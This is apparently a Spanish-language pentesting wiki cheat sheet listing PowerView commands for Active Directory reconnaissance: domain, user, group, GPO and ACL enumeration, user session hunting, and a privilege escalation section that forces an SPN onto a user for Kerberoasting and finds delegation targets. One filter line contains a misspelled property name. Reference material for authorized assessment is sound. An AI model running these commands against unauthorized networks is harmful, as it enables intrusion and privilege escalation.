---
title: "PowerSploit / PowerView Cheat Sheet"
category: "AD"
description: "Comandos esenciales para enumeración de Active Directory usando PowerView y PowerSploit."
image: "/images/wiki/2.png"
---

# PowerSploit & PowerView: Reconocimiento de Active Directory

**PowerSploit** es una colección de módulos de Microsoft PowerShell que pueden utilizarse para ayudar a los pentesters durante todas las fases de una evaluación. **PowerView** es su herramienta de reconocimiento más famosa.

[Repositorio Oficial (Dev)](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
[Wiki de PowerView](https://powersploit.readthedocs.io/en/latest/)

## Enumeración de Dominio

### Información Básica
*   **Obtener Dominio Actual**: `Get-Domain`
*   **Enumerar Otros Dominios**: `Get-Domain -Domain <DomainName>`
*   **Obtener SID del Dominio**: `Get-DomainSID`
*   **Políticas de Dominio**:
    ```powershell
    Get-DomainPolicy
    # Ver políticas de sistema (contraseñas) y Kerberos
    Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
    Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
    ```
*   **Controladores de Dominio**: `Get-DomainController`

### Usuarios y Grupos
*   **Guardar Usuarios en Archivo**:
    `Get-DomainUser | Out-File -FilePath .\DomainUsers.txt`
*   **Detalles de Usuario Específico**:
    `Get-DomainUser -Identity <User> -Properties DisplayName, MemberOf | Format-List`
*   **Enumerar Grupos**:
    `Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt`
*   **Miembros de Admin de Dominio**:
    `Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberDistinguishedName`

### Computadoras
*   **Listar Computadoras**:
    `Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName`
*   **Computadoras Vivas (Ping)**:
    `Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName`

### GPOs (Políticas de Grupo)
*   **Listar GPOs**:
    `Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName`
*   **GPOs de una Computadora**:
    `Get-DomainGPO -ComputerIdentity <ComputerName>`
*   **Usuarios en Grupo Admin Local via GPO**:
    `Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>`

### ACLs (Listas de Control de Acceso)
*   **ACLs de un Usuario**:
    `Get-DomainObjectAcl -Identity <AccountName> -ResolveGUIDs`
*   **ACLs Interesantes**:
    `Find-InterestingDomainAcl -ResolveGUIDs`
*   **Verificar ACL de un Share**:
    `Get-PathAcl -Path "\\Path\Of\A\Share"`

## Funciones de Caza (User Hunting)

*   **Encontrar Dónde soy Admin Local**:
    `Find-LocalAdminAccess -Verbose`
*   **Verificar Acceso Admin**:
    `Test-AdminAccess`
*   **Buscar dónde están logueados los usuarios (Sesiones)**:
    `Find-DomainUserLocation | Select-Object UserName, SessionFromName`

## Escalamiento de Privilegios

### Force Set SPN (Requiere permisos GenericAll/GenericWrite)
Si tienes permisos sobre un usuario, puedes forzarle un SPN para luego atacarlo con Kerberoasting.

```powershell
# Verificar permisos
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "TargetUser"}

# Establecer SPN
Set-DomainObject <TargetUser> -Set @{serviceprincipalname='ops/whatever1'}
```

### Unconstrained Delegation
Descubrir computadoras con delegación no restringida (donde quedan los TGTs de quien se conecte).

```powershell
Get-NetComputer -UnConstrained
```

### Constrained Delegation
Descubrir usuarios y computadoras confiados para delegación.

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
